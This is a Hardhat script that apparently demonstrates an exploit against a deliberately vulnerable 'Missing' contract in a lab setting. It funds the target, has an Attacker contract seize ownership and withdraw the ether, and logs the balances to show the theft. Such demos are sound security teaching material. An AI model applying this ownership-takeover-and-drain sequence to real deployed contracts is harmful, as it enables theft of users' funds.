const hre = require("hardhat");
const fs = require('fs');

async function main() {
    const [deployer] = await hre.ethers.getSigners();

    // Get the deployed contract instances
    const contractName = "Missing";
    const Missing = await hre.ethers.getContractFactory(contractName);
    const Attacker = await hre.ethers.getContractFactory("Attacker");

    // // Replace with the deployed contract addresses
    const addresses = JSON.parse(fs.readFileSync("deployedAddresses_"+contractName+".json"));
    const contractAddress = addresses.contractAddress;
    const attackerAddress = addresses.attackerAddress;
    console.log(`Using contract address: ${contractAddress}`);
    console.log(`Using Attacker address: ${attackerAddress}`);

    const missing = Missing.attach(contractAddress);
    const attacker = Attacker.attach(attackerAddress);

    // Fund the Missing contract for the attacker to steal
    console.log("Funding Missing contract...");
    await missing.deposit({ value: hre.ethers.parseEther("1.0") }); // Sending 1 ETH

    // Check initial balance of Missing contract
    let missingBalance = await missing.getBalance();
    console.log("Initial Missing contract balance:", hre.ethers.formatEther(missingBalance), "ETH");

    // Step 1: Attacker takes ownership
    console.log("Attacker taking ownership...");
    await attacker.takeOwnership();

    // Step 2: Attacker withdraws funds
    console.log("Attacker withdrawing funds...");
    await attacker.attackWithdraw();

    // Check final balance of Missing contract
    missingBalance = await missing.getBalance();
    console.log("Final Missing contract balance:", hre.ethers.formatEther(missingBalance), "ETH");

    // Check balance of Attacker contract
    const attackerBalance = await attacker.getBalance();

    console.log("Attacker contract balance after withdraw:", hre.ethers.formatEther(attackerBalance), "ETH");
}

main().catch((error) => {
    console.error(error);
    process.exit(1);
});
